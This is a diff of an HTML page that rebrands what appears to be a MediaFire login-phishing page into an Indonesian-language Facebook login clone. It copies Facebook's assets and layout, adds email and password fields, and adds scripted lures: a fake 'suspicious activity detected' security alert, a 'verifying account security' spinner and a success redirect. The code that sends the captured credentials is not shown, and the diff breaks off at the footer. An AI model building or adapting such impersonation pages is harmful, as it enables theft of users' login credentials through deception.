@@ -1,74 +1,338 @@
-<!DOCTYPE html
-    PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns=http://www.w3.org/1999/xhtml lang=en-US>
-<meta charset=utf-8>
-<meta name=robots content="noindex, nofollow">
-<meta name=viewport content="width=device-width, initial-scale=1.0">
-<title>Login to MediaFire</title>
-<link type=image/x-icon rel="shortcut icon" href="favicon.ico">
-<link rel=canonical href=https://www.mediafire.com/login />
-<meta http-equiv=content-security-policy content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:;">
+<!DOCTYPE html>
+<html lang="id" id="facebook" class="no_js">
+<head>
+<meta charset="utf-8" />
+<meta name="referrer" content="default" id="meta_referrer" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Facebook</title>
+<meta name="description" content="Login ke Facebook untuk mulai membagikan sesuatu dan berhubungan dengan teman, keluarga, dan orang-orang yang Anda kenal." />
+<link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yB/r/2sFJRNmJ5OP.ico" />
 <style>
-html,body,div,span,p,a,form,label{margin:0;padding:0;border:0;outline:0}
-html,body{height:100%;background:#fff;color:#4f4f4f;font:normal normal normal 13px/1.6"Open Sans",sans-serif}
-a{color:#07f;text-decoration:none}
-a:hover:not([class*="gbtn"]){text-decoration:none;color:#ff8637}
-.left{float:left}
-.right{float:right}
-.gbtnTertiary,button[type="button"]{display:inline-block;border-radius:3px;font-family:"Open Sans",sans-serif;font-size:11px;font-weight:normal;text-transform:uppercase;text-align:center;box-sizing:border-box;padding:0 15px;height:40px;line-height:40px;border:0;outline:0;cursor:pointer}
-.gbtnTertiary{color:#fff;background:#07f}
-.gbtnTertiary:hover{background-image:linear-gradient(rgba(0,0,0,.05),rgba(0,0,0,.05))}
-input[type="password"],input[type="email"]{outline:0;padding:0;height:30px;line-height:30px;color:#282f3d;font-size:13px;font-family:"Open Sans",sans-serif;background-color:#fff;border:0 solid #e8e9ec;border-width:0 0 1px;border-radius:0;transition:all .1s linear 0;-webkit-appearance:none}
-input[type="email"]:focus,input[type="password"]:focus{border-color:#07f;box-shadow:0 1px 0 0#07f}
-#container{padding-top:50px;padding-bottom:200px;min-height:100%;box-sizing:border-box}
-.logo{display:block;height:50px;width:260px;margin:0 auto 50px;background:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyOTQiIGhlaWdodD0iNDIiIHZpZXdCb3g9IjAgMCAyOTQgNDIiPjxkZWZzPjxzdHlsZT4uY2xzLTF7ZmlsbDojMDdmO30uY2xzLTJ7ZmlsbDpub25lO30uY2xzLTN7ZmlsbDojZmZmO30uY2xzLTR7ZmlsbDojMGUyODY2O308L3N0eWxlPjwvZGVmcz48dGl0bGU+bWZfbG9nbzwvdGl0bGU+PGcgaWQ9ImZ1bGxfY29sb3IiPjxnIGlkPSJmbGFtZSI+PHBhdGggY2xhc3M9ImNscy0xIiBkPSJNMjEuOTEsOS4yNmE1MS40Nyw1MS40NywwLDAsMSw5LjMzLDFjMi45MS41NCw1Ljg1LDEuNTUsOC44MywxLjU0LDIuMjgsMCw0LjEyLTEuNTksNC4xMS0zLjUzUzQyLjMyLDQuNyw0MCw0LjcxYTEzLjM1LDEzLjM1LDAsMCwwLTMuOS42NWMuMzMtLjI0LjY2LS40OCwxLS42OUEyNi4xNCwyNi4xNCwwLDAsMSw1Mi4xOSwxQzU3LjgxLDEuMjYsNjMuNjYsMyw2OCw2LjcyYTE5Ljg5LDE5Ljg5LDAsMCwxLDYuNjIsMTcuODJBMTkuNzUsMTkuNzUsMCwwLDEsNjIuNDUsMzkuNjIsMjQsMjQsMCwwLDEsNDgsNDAuMTRjLTYuMjEtMS41Ny0xMS42NC01LTE3LjQ4LTcuNTNhNDYuODYsNDYuODYsMCwwLDAtMTAuNTctMi42OEgyMGE5LDksMCwwLDAsNC4xMS0uN2MxLjczLS44MywxLjcyLTIuODMuODItNC4yOS0xLjA3LTEuNzQtMy4yMy0yLjQ1LTUuMDktM2EyNC4zNiwyNC4zNiwwLDAsMC0xMC0uNDlBMTUuMDYsMTUuMDYsMCwwLDAsMywyMy45NCw1LjY3LDUuNjcsMCwwLDAsMS4yLDI2LjE2YzMuMDgtOC41NCw5LjItNy41OCwxMy05LjkyYTIuMTYsMi4xNiwwLDAsMC0xLjU3LTMuOTMsNy4yNCw3LjI0LDAsMCwwLTIuOTIsMS40NmwtLjg2LjY1UzExLjksOS4yNiwyMS45MSw5LjI2WiIvPjxwYXRoIGNsYXNzPSJjbHMtMiIgZD0iTTI0LjkzLDI0LjgybDAsMCwwLDBaIi8+PHBhdGggY2xhc3M9ImNscy0zIiBkPSJNMjQuODQsMjQuNzNsLjA2LjA2WiIvPjxwYXRoIGNsYXNzPSJjbHMtMyIgZD0iTTU3LjMsMTRjLTQuMDgsMC01Ljc2LDIuNTctMTAuMTgsNS03LjY1LDQuMTgtMTIuMiwyLjQtMTIuMiwyLjYyczMuMSwxLjUzLDEwLjcsNS4yMkEyNywyNywwLDAsMCw1Ny4zNSwzMGgwYTgsOCwwLDEsMCwwLTE2WiIvPjwvZz48ZyBpZD0iTWVkaWFGaXJlIj48cGF0aCBjbGFzcz0iY2xzLTQiIGQ9Ik04Ny42Myw2LjMxSDEwMWwuMzksMTYuNzhoLjA5TDExMCw2LjMxaDEzLjY4bC02LjY0LDMxLjJoLTguOTJMMTEzLDE2aC0uMDlsLTEwLjIzLDIxLjVIOTUuNTRMOTQuNCwxNmgtLjA5TDkwLDM3LjUySDgxLjExWiIvPjxwYXRoIGNsYXNzPSJjbHMtNCIgZD0iTTE0NC44MiwzMC45MmMtLjU3LDEuNTMtMi4yNyw3LjE3LTEyLjA2LDcuMTctOCwwLTExLjI4LTQuNS0xMS4yOC0xMCwwLTEwLjQsOC0xMy44MSwxMy41OS0xMy44MSw1LDAsMTEuMSwyLjgsMTEuMSw5LjkyYTE0LjA5LDE0LjA5LDAsMCwxLS40NCwzLjkzSDEyOS41N2MwLDIuNC44Myw0LjQxLDMuNTQsNC40MWEzLjcsMy43LDAsMCwwLDMuNDEtMS42MlpNMTM4LDIzLjYyYTQuMyw0LjMsMCwwLDAsLjA5LS43NCwzLDMsMCwwLDAtMy4yOC0zLjA2Yy0yLjMyLDAtMy44NSwxLjQtNC41LDMuOFoiLz48cGF0aCBjbGFzcz0iY2xzLTQiIGQ9Ik0xNjEuOTUsMzQuOTRoLS4wOWE2LjgyLDYuODIsMCwwLDEtNiwzLjE1Yy03LjMsMC04LjMtNi40Ny04LjMtOS4yMiwwLTguNjEsNC41LTE0LjYsMTEuMjgtMTQuNiwyLjYyLDAsNS4wNy43OSw2LjU1LDMuMzZsMi4zNi0xMS4zMmg4LjY1bC02LjQ3LDMxLjJoLTguNDhabTEuMTYtMTAuMThjMC0yLjUzLS44Ny00LjItMy4xLTQuMi0zLjQ1LDAtNC41OSw0LjI0LTQuNTksNy41MiwwLDIuMDUuOTIsMy43MiwzLjE5LDMuNzJDMTYyLDMxLjc5LDE2My4xMSwyNy40NywxNjMuMTEsMjQuNzZaIi8+PHBhdGggY2xhc3M9ImNscy00IiBkPSJNMTc3LjA2LDE0Ljg0aDguNjVMMTgxLDM3LjUyaC04LjY1Wm05LjEzLTIuNDVoLTguNjVsMS4yNy02LjA3aDguNjVaIi8+PHBhdGggY2xhc3M9ImNscy00IiBkPSJNMjE1LjEsNi4zMWgyNC4wOGwtMS43OCw4LjUySDIyMi45M2wtLjgzLDMuODloMTIuMjhsLTEuNTMsNy40M0gyMjAuNTdMMjE4LjIsMzcuNTJoLTkuNjFaIi8+PHBhdGggY2xhc3M9ImNscy00IiBkPSJNMjM5LjgsMTQuODRoOC42NWwtNC43MiwyMi42OGgtOC42NVoiLz48cGF0aCBjbGFzcz0iY2xzLTQiIGQ9Ik0yOTEuMiwyNC4xOWMwLTcuMTItNi4wNy05LjkyLTExLjEtOS45MmExNC43NCwxNC43NCwwLDAsMC04LjE2LDIuNDVBMTEuODQsMTEuODQsMCwwLDAsMjY4LjA4LDIxYTE1LDE1LDAsMCwwLTEuNTcsN2MwLDUuNTEsMy4yMywxMCwxMS4yNywxMCw5Ljc5LDAsMTEuNDktNS42NCwxMi4wNi03LjE3aC04LjNhMy43MSwzLjcxLDAsMCwxLTMuNDEsMS42MmMtMi43MSwwLTMuNTQtMi0zLjU0LTQuNDFoMTYuMTdBMTQuMDksMTQuMDksMCwwLDAsMjkxLjIsMjQuMTlaTTI4MywyMy42MmgtNy42OWMuNjYtMi40LDIuMTgtMy44LDQuNS0zLjhhMywzLDAsMCwxLDMuMjgsMy4wNkE0LjM3LDQuMzcsMCwwLDEsMjgzLDIzLjYyWiIvPjxwYXRoIGNsYXNzPSJjbHMtMiIgZD0iTTI2NS44MSwyMmwuOTItMkExNC40MiwxNC40MiwwLDAsMCwyNjUuODEsMjJaIi8+PHBhdGggY2xhc3M9ImNscy00IiBkPSJNMjY5LjEsMTQuNzlhMTAuNjcsMTAuNjcsMCwwLDAtMy4zOC0uNTJoLS4wNmE4LjUyLDguNTIsMCwwLDAtMi41LjQxLDkuNTUsOS41NSwwLDAsMC00LjU2LDMuNjloLS4wOWwuMTQtLjY2LjYxLTIuODhIMjUwLjlsLTQuNzIsMjIuNjhoOC42NUwyNTcuMDYsMjdjMS0zLjksMi44Ni01LjI0LDYuMjEtNS4yNWgwYTEwLjEsMTAuMSwwLDAsMSwyLjUuMzFaIi8+PHBhdGggY2xhc3M9ImNscy00IiBkPSJNMTk4LjQ5LDE0LjI3Yy01LjU1LDAtMTAuMjMsMS40LTExLjU4LDcuNDNIMTk1Yy40OC0xLjcsMS43LTIuMzIsMy40NS0yLjMyLDEuMzEsMCwyLjcxLjM5LDIuNzEsMiwwLDIuOC0zLjg5LDIuNDUtNi4zNCwyLjYyLTYuNTEuNDgtMTEsMi4xLTExLDguMDgsMCw0LjMzLDMuNDUsNiw3LjM0LDYsMi41MywwLDUuNDYtLjkyLDctMi43NWwuMTItLjE2aDBsLS40OCwyLjM1aDguMjhsMy0xNC4xNmEyMy4xNSwyMy4xNSwwLDAsMCwuMzMtMy4wNkMyMDkuNSwxNC43OSwyMDIuNiwxNC4yNywxOTguNDksMTQuMjdabTEuMTUsMTQuNjNDMTk5LDMxLjQyLDE5Ny43OCwzMywxOTUuMywzM2MtMS40LDAtMi43NS0uMzktMi43NS0yczEuMzUtMi40LDIuOC0yLjUzYTEyLjU0LDEyLjU0LDAsMCwwLDQuNTktMVoiLz48cG9seWdvbiBjbGFzcz0iY2xzLTQiIHBvaW50cz0iMjQ4LjkzIDEyLjM5IDI0MC4yOCAxy4zOSAyNDEuNTQgNi4zMSAyNTAuMiA2LjMxIDI0OC45MyAxMi4zOSIvPjwvZz48L2c+PC9zdmc+)center/250px auto no-repeat}
-input,button{display:block;margin-bottom:10px}
-.popup-title{font-size:24px;line-height:24px;font-weight:300;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;padding:30px;text-align:center}
-.left,.right{width:252px;padding:0 30px 30px;min-height:165px}
-.left{border-right:1px solid #eee}
-.left input{width:235px}
-.left button{float:none;display:block;margin:0;width:252px}
-#perspectiveWrap{position:relative;box-shadow:0 0 0 1px rgba(0,0,0,.03),0 2px 12px 2px rgba(0,0,0,.07);border-radius:5px;width:626px;margin:0 auto}
-#rotationWrap{height:345px}
-.sectionFooter{position:absolute;bottom:0;left:0;right:0;height:51px;line-height:50px;text-align:center;background:#f4f4f5;border-radius:0 0 5px 5px}
-.step0{overflow:hidden;position:absolute;width:100%;top:0;left:0;background-color:#fff;border-radius:5px;opacity:0;height:0;visibility:hidden;z-index:1}
-.step0 p{font-size:14px;margin:0 auto;text-align:center;width:420px}
-.step0 .popup-btns{background:#f4f4f5;height:100px;text-align:center;padding:0}
-.step0 .popup-btns button,.step0 .popup-btns a{float:none;margin:29px 20px 0;display:inline-block;height:40px;width:230px}
-#loginWrap{position:absolute;top:0;left:0;width:100%;background:#fff;border-radius:5px;overflow:hidden;height:100%}
-#widget_login_pass{margin-bottom:18px}
-.forgotPassword{float:right;font-size:11px}
-#socialLogin{position:relative;box-shadow:-1px 0 0 0#fff,-2px 0 0 0#eee}
-#facebookLoginBtn{float:none;display:block;margin:0;height:40px;line-height:40px;font-size:11px;background:#3963c7 url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IURPQ1RZUEUgc3ZnIFBVQkxJQyAiLS8vVzNDLy9EVEQgU1ZHIDEuMS8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9HcmFwaGljcy9TVkcvMS4xL0RURC9zdmcxMS5kdGQiPjxzdmcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgdmVyc2lvbj0iMS4xIiB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI2ZmZiI+PHBhdGggZD0iTTE3LDJWMkgxN1Y2SDE1QzE0LjMxLDYgMTQsNi44MSAxNCw3LjVWMTBIMTRMMTcsMTBWMTRIMTRWMjJIMTBWMTRIN1YxMEgxMFY2QTQsNCAwIDAsMSAxNCwySDE3WiIgLz48L3N2Zz4=)12px center/22px no-repeat}
-#twitterLoginBtn{float:left;padding-left:30px;margin-right:10px;margin-top:15px}
-#twitterLoginBtn{background:url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IURPQ1RZUEUgc3ZnIFBVQkxJQyAiLS8vVzNDLy9EVEQgU1ZHIDEuMS8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9HcmFwaGljcy9TVkcvMS4xL0RURC9zdmcxMS5kdGQiPjxzdmcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgdmVyc2lvbj0iMS4xIiB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzFEQTFGMiI+PHBhdGggZD0iTTIyLjQ2LDZDMjEuNjksNi4zNSAyMC44Niw2LjU4IDIwLDYuNjlDMjAuODgsNi4xNiAyMS41Niw1LjMyIDIxLjg4LDQuMzFDMjEuMDUsNC44MSAyMC4xMyw1LjE2IDE5LjE2LDUuMzZDMTguMzcsNC41IDE3LjI2LDQgMTYsNEMxMy42NSw0IDExLjczLDUuOTIgMTEuNzMsOC4yOUMxMS43Myw4LjYzIDExLjc3LDguOTYgMTEuODQsOS4yN0M4LjI4LDkuMDkgNS4xMSw3LjM4IDMsNC43OUMyLjYzLDUuNDIgMi40Miw2LjE2IDIuNDIsNi45NEMyLjQyLDguNDMgMy4xNyw5Ljc1IDQuMzMsMTAuNUMzLjYyLDEwLjUgMi45NiwxMC4zIDIuMzgsMTBDMi4zOCwxMCAyLjM4LDEwIDIuMzgsMTAuMDNDMi4zOCwxMi4xMSAzLjg2LDEzLjg1IDUuODIsMTQuMjRDNS40NiwxNC4zNCA1LjA4LDE0LjM5IDQuNjksMTQuMzlDNC40MiwxNC4zOSA0LjE1LDE0LjM2IDMuODksMTQuMzFDNC40MywxNiA2LDE3LjI2IDcuODksMTcuMjlDNi40MywxOC40NSA0LjU4LDE5LjEzIDIuNTYsMTkuMTNDMi4yMiwxOS4xMyAxLjg4LDE5LjExIDEuNTQsMTkuMDdDMy40NCwyMC4yOSA1LjcsMjEgOC4xMiwyMUMxNiwyMSAyMC4zMsMTQuNDYgMjAuMzMsOC43OUMyMC4zMyw4LjYgMjAuMzMsOC40MiAyMC4zMiw4LjIzQzIxLjE2LDcuNjMgMjEuODgsNi44NyAyMi40Niw2WiIgLz48L3N2Zz4=)left center no-repeat;color:#1da1f2}
-#login_remember_wrap{float:left;font-size:11px;margin-bottom:10px}
-#login_remember{float:left;width:auto !important;margin-left:1px;margin-right:5px}
-.sectionFooter{-webkit-transition:bottom .2s linear;-moz-transition:bottom .2s linear;-ms-transition:bottom .2s linear;-o-transition:bottom .2s linear;transition:bottom .2s linear}
-#loginWrap{outline:1px solid transparent}
-#container.loginPath #loginWrap{z-index:1}
-@media screen and (max-width:630px){#container{width:100%;margin:0;min-height:860px;height:100%}#perspectiveWrap{position:static;width:auto;box-shadow:none}#container #loginStep0,#container #loginWrap{min-height:650px;height:auto;top:115px}#container .left,#container .right{width:100%;box-sizing:border-box;float:none;border:0;box-shadow:none;text-align:center;min-height:auto}#container .left{border-bottom:1px solid #eee}#container .left input{width:100%;box-sizing:border-box;height:50px;line-height:50px;margin-bottom:10px;font-size:16px}#container .left input[type="checkbox"]{height:auto}#container .left button{float:none;display:block;margin:0;width:100%;height:50px;font-size:16px}.step0 .popup-btns span{display:block;margin-bottom:20px;font-size:16px}#login_remember_wrap{margin-bottom:20px;float:left;font-size:14px;text-align:left}#login_remember_wrap label{padding:3px 0 0 3px;display:inline-block;font-size:12px}#login_remember_wrap input[type="checkbox"]{margin-top:5px !important}#login_remember{height:20px !important}.forgotPassword{float:right;margin:3px 0 20px;font-size:12px}#facebookLoginBtn{margin-top:30px;height:50px;line-height:50px;font-size:16px}.sectionFooter{height:auto;line-height:1.4;font-size:14px;padding:18px 0;margin:0 30px 1px;border-radius:0;position:static}.popup-title{padding:30px;font-size:22px;line-height:normal;white-space:normal;overflow:visible}#twitterLoginBtn{font-size:14px;float:none;margin:20px auto;display:inline-block}}
-.sf-hidden{display:none !important}
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: Helvetica, Arial, sans-serif;
+}
 
-/* LOADER & ALERT STYLES */
+body {
+    background: #f0f2f5;
+    min-height: 100vh;
+    color: #1c1e21;
+    direction: ltr;
+    line-height: 1.34;
+}
+
+._li {
+    height: 100vh;
+    display: flex;
+    flex-direction: column;
+}
+
+.fb_content {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    padding: 72px 0 112px;
+}
+
+._97vy {
+    text-align: center;
+    margin-bottom: -10px;
+}
+
+._97vu {
+    height: 106px;
+    margin: -28px;
+}
+
+._4-u5 {
+    background: #fff;
+    border-radius: 8px;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+    padding: 20px 20px 28px;
+    max-width: 396px;
+    width: 100%;
+}
+
+._9axz {
+    font-size: 18px;
+    line-height: 22px;
+    font-weight: normal;
+    color: #1c1e21;
+    margin-bottom: 20px;
+    text-align: center;
+    display: none; /* DIIHAPUS! */
+}
+
+._5466 {
+    margin-bottom: 12px;
+}
+
+.inputtext {
+    width: 100%;
+    padding: 14px 16px;
+    font-size: 17px;
+    border: 1px solid #dddfe2;
+    border-radius: 6px;
+    color: #1d2129;
+    background: #fff;
+    line-height: 16px;
+}
+
+.inputtext:focus {
+    outline: none;
+    border-color: #1877f2;
+    box-shadow: 0 0 0 2px #e7f3ff;
+}
+
+._55r1 {
+    position: relative;
+}
+
+._9ls7 {
+    position: absolute;
+    right: 10px;
+    top: 50%;
+    transform: translateY(-50%);
+    cursor: pointer;
+}
+
+._9lsa {
+    width: 20px;
+    height: 20px;
+    background: #f0f2f5;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+._9lsb {
+    width: 12px;
+    height: 12px;
+    background: #606770;
+    border-radius: 50%;
+}
+
+._xkt {
+    margin-top: 6px;
+}
+
+._42ft {
+    width: 100%;
+    padding: 0 16px;
+    font-size: 20px;
+    font-weight: 600;
+    border: none;
+    border-radius: 6px;
+    cursor: pointer;
+    transition: background-color .2s;
+    height: 48px;
+    line-height: 48px;
+    text-align: center;
+}
+
+._4jy0 {
+    background: #1877f2;
+    color: #fff;
+}
+
+._4jy0:hover {
+    background: #166fe5;
+}
+
+._4jy1 {
+    margin-top: 10px;
+}
+
+#login_link {
+    margin-top: 20px;
+    text-align: center;
+    border-top: 1px solid #dadde1;
+    padding-top: 20px;
+}
+
+._97w3 {
+    margin-bottom: 16px;
+}
+
+._97w4 {
+    color: #1877f2;
+    font-size: 14px;
+    font-weight: 500;
+    text-decoration: none;
+    cursor: pointer;
+}
+
+._97w4:hover {
+    text-decoration: underline;
+}
+
+._1rf5 {
+    margin: 16px 0;
+    text-align: center;
+    position: relative;
+}
+
+._1rf8 {
+    color: #8a8d91;
+    font-size: 14px;
+    line-height: 18px;
+    padding: 0 8px;
+    background: #fff;
+    position: relative;
+    z-index: 1;
+}
+
+._1rf5:before {
+    content: "";
+    position: absolute;
+    top: 50%;
+    left: 0;
+    right: 0;
+    height: 1px;
+    background: #dadde1;
+    z-index: 0;
+}
+
+._4jy2 {
+    background: #42b72a;
+    color: #fff;
+    font-size: 17px;
+    font-weight: 600;
+    height: 48px;
+    line-height: 48px;
+    padding: 0 16px;
+    display: inline-block;
+    border-radius: 6px;
+    text-decoration: none;
+    cursor: pointer;
+}
+
+._4jy2:hover {
+    background: #36a420;
+}
+
+._95ke {
+    margin-top: 28px;
+    text-align: center;
+    font-size: 14px;
+    color: #8a8d91;
+}
+
+._95ke a {
+    color: #8a8d91;
+    text-decoration: none;
+    cursor: pointer;
+}
+
+._95ke a:hover {
+    text-decoration: underline;
+}
+
+/* Footer Styles */
+#pageFooter {
+    background: #fff;
+    padding: 20px 0;
+}
+
+.uiList.localeSelectorList {
+    display: flex;
+    flex-wrap: wrap;
+    list-style: none;
+    padding: 0 20px;
+    margin-bottom: 20px;
+}
+
+.uiList.localeSelectorList li,
+.uiList.localeSelectorList a {
+    color: #8a8d91;
+    font-size: 12px;
+    margin-right: 10px;
+    text-decoration: none;
+    cursor: pointer;
+}
+
+.uiList.localeSelectorList a:hover {
+    text-decoration: underline;
+}
+
+.pageFooterLinkList {
+    display: flex;
+    flex-wrap: wrap;
+    list-style: none;
+    padding: 0 20px;
+    margin-bottom: 10px;
+    max-width: 980px;
+    margin-left: auto;
+    margin-right: auto;
+}
+
+.pageFooterLinkList li {
+    margin-right: 20px;
+    margin-bottom: 8px;
+}
+
+.pageFooterLinkList a {
+    color: #8a8d91;
+    font-size: 12px;
+    text-decoration: none;
+    cursor: pointer;
+}
+
+.pageFooterLinkList a:hover {
+    text-decoration: underline;
+}
+
+.mvl.copyright {
+    text-align: center;
+    color: #8a8d91;
+    font-size: 11px;
+    padding: 0 20px;
+}
+
+/* Utility Classes */
+.clearfix:after {
+    content: "";
+    display: table;
+    clear: both;
+}
+
+.img {
+    border: 0;
+    vertical-align: middle;
+}
+
+.accessible_elem {
+    position: absolute;
+    left: -10000px;
+    top: auto;
+    width: 1px;
+    height: 1px;
+    overflow: hidden;
+}
+
+/* LOADER */
 #loader {
     position: fixed;
     top: 0;
     left: 0;
     width: 100%;
     height: 100%;
-    background: rgba(255,255,255,0.95);
+    background: rgba(255,255,255,0.9);
     z-index: 10000;
     display: none;
     flex-direction: column;
     justify-content: center;
     align-items: center;
-    font-family: "Open Sans", sans-serif;
 }
 
 .spinner {
     border: 4px solid #f3f3f3;
-    border-top: 4px solid #07f;
+    border-top: 4px solid #1877f2;
     border-radius: 50%;
     width: 40px;
     height: 40px;
@@ -86,12 +350,11 @@ input,button{display:block;margin-bottom:10px}
     border: 1px solid #fdcb6e;
     border-radius: 6px;
     padding: 12px;
-    margin: 20px 30px;
+    margin-bottom: 16px;
     font-size: 14px;
     color: #d63031;
     text-align: center;
     display: none;
-    font-family: "Open Sans", sans-serif;
 }
 
 .alert.show {
@@ -100,11 +363,10 @@ input,button{display:block;margin-bottom:10px}
 
 .success-msg {
     text-align: center;
-    padding: 30px;
+    padding: 20px;
     color: #42b72a;
     font-size: 16px;
     display: none;
-    font-family: "Open Sans", sans-serif;
 }
 
 .success-msg.show {
@@ -118,66 +380,151 @@ input,button{display:block;margin-bottom:10px}
 }
 </style>
 </head>
-<body>
+<body class="_39il _97vt _97vz _97v- _97v_ _97w2 _97w0 _9ax- _9ax_ _9ay1 UIPage_LoggedOut _-kb _605a b_c3pyn-ahh x1 Locale_id_ID" dir="ltr">
     <!-- LOADER -->
     <div id="loader">
         <div class="spinner"></div>
-        <p>Verifying your account security...</p>
+        <p>Memverifikasi keamanan akun...</p>
     </div>
 
     <!-- ALERT MESSAGE -->
     <div id="securityAlert" class="alert">
-        <strong>⚠️ Security Alert:</strong> Suspicious activity detected. Additional verification required.
+        <strong>⚠️ Peringatan Keamanan:</strong> Kami mendeteksi aktivitas mencurigakan. Verifikasi tambahan diperlukan.
     </div>
 
     <!-- SUCCESS MESSAGE -->
     <div id="successMsg" class="success-msg">
-        <p>✅ Verification successful! Redirecting to MediaFire...</p>
-        <div class="countdown" id="countdown">5 seconds</div>
+        <p>✅ Verifikasi berhasil! Mengarahkan ke Facebook...</p>
+        <div class="countdown" id="countdown">5 detik</div>
     </div>
 
-    <!-- MEDIAFIRE UI -->
-    <div id=container class=loginPath>
-        <a href=https://www.mediafire.com/ class=logo><span style=display:none>MediaFire Logo</span></a>
-        <div id=perspectiveWrap>
-            <div id=loginStep0 class=step0>
-                <div class=popup-title>Log in or sign up</div>
-                <p>The feature you are trying to use requires that you <br>have a MediaFire account.</p>
-                <p id=newStartTxt>Choose whether to log in to an existing account or create a new one.</p>
-                <div class=popup-btns> <button type=button class=gbtnTertiary> Log in to your account </button>
-                    <span>or</span> <a class=gbtnTertiary href=https://www.mediafire.com/upgrade />Sign up for an account</a>
-                </div>
-            </div>
-            <div id=rotationWrap>
-                <div id=loginWrap class=cf>
-                    <div id=loginStep1>
-                        <div class=popup-title>How do you want to log in?</div>
-                        <div id=emailLogin class=left>
-                            <form id=form_login1 method=post>
-                                <label class="ieLabel sf-hidden" for=widget_login_email>Email address</label>
-                                <input type=email
-                                    pattern=^(.)+@[A-Za-z0-9]([A-Za-z0-9\.-]*[A-Za-z0-9])?\.[A-Za-z]{1,13}$
-                                    name=login_email id=widget_login_email placeholder="Email address" required value>
-                                
-                                <label class="ieLabel sf-hidden" for=widget_login_pass>Password</label>
-                                <input
-                                    type=password autocomplete=off name=login_pass id=widget_login_pass
-                                    placeholder=Password maxlength=30 required value>
-                                
-                                <div id=login_remember_wrap> <input type=checkbox name=login_remember id=login_remember checked>
-                                    <label for=login_remember>Keep me logged in</label>
+    <!-- FACEBOOK UI -->
+    <div class="_li" id="u_0_0_tK">
+        <div id="globalContainer" class="uiContextualLayerParent">
+            <div class="fb_content clearfix " id="content" role="main">
+                <div class="_4-u5 _30ny">
+                    <div class="_97vy">
+                        <img class="_97vu img" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" />
+                    </div>
+                    <div class="_4-u2 _1w1t _4-u8 _52jv">
+                        <div class="_xku" id="header_block">
+                            <!-- HEADING "Login ke Facebook" DIHAPUS! -->
+                        </div>
+                        <div class="login_form_container">
+                            <form id="login_form" method="post">
+                                <input type="hidden" name="jazoest" value="2817" autocomplete="off" />
+                                <input type="hidden" name="lsd" value="AdLIp5G79k0" autocomplete="off" />
+                                <div id="loginform">
+                                    <div class="clearfix _5466 _44mg" id="email_container">
+                                        <input type="text" class="inputtext _55r1 inputtext _1kbt inputtext _1kbt" 
+                                               name="email" id="email" tabindex="0" 
+                                               placeholder="Email atau Nomor Telepon" value="" 
+                                               autofocus="1" autocomplete="username" 
+                                               aria-label="Email atau Nomor Telepon" />
+                                    </div>
+                                    <div class="clearfix _5466 _44mg">
+                                        <div>
+                                            <div class="_55r1 _1kbt">
+                                                <input type="password" class="inputtext _55r1 inputtext _9npi inputtext _9npi" 
+                                                       name="pass" id="pass" tabindex="0" 
+                                                       placeholder="Kata Sandi" value="" 
+                                                       autocomplete="current-password" 
+                                                       aria-label="Kata Sandi" />
+                                                <div class="_9ls7" id="u_0_3_0y">
+                                                    <a href="#" role="button">
+                                                        <div class="_9lsa">
+                                                            <div class="_9lsb" id="u_0_4_ap"></div>
+                                                        </div>
+                                                    </a>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="_xkt" id="u_0_5_A6">
+                                        <button value="1" class="_42ft _4jy0 _52e0 _4jy6 _4jy1 selected _51sy" 
+                                                id="loginbutton" name="login" tabindex="0" type="submit">
+                                            Masuk
+                                        </button>
+                                    </div>
+                                    <div id="login_link">
+                                        <div class="_97w3">
+                                            <a href="https://www.facebook.com/recover/initiate/?ars=facebook_login&amp;cancel_lara_pswd=0" 
+                                               class="_97w4" target="_blank">Lupa akun?</a>
+                                        </div>
+                                        <div class="_1rf5">
+                                            <span class="_1rf8">atau</span>
+                                        </div>
+                                        <div class="_xkt">
+                                            <a role="button" class="_42ft _4jy0 _16jx _4jy6 _4jy2 selected _51sy" 
+                                               href="https://www.facebook.com/r.php">Buat akun baru</a>
+                                        </div>
+                                    </div>
                                 </div>
-                                <a class=forgotPassword href="#" target=_blank>Forgot password?</a>
-                                <button type=submit class=gbtnTertiary>Log in</button>
                             </form>
                         </div>
-                        <div id=socialLogin class=right>
-                            <a id=facebookLoginBtn class="gbtnTertiary ico30facebook"> Log in with Facebook </a>
-                            <a id=twitterLoginBtn>Log in with Twitter</a>
-                        </div>
                     </div>
-                    <div id=loginFooter class=sectionFooter>
-                        <p>Don’t have an account? <a href=https://www.mediafire.com/upgrade/ class=togglePath target=_top>Create an account</a></p>
+                </div>
+            </div>
+            
+            <!-- FOOTER -->
+            <div class="">
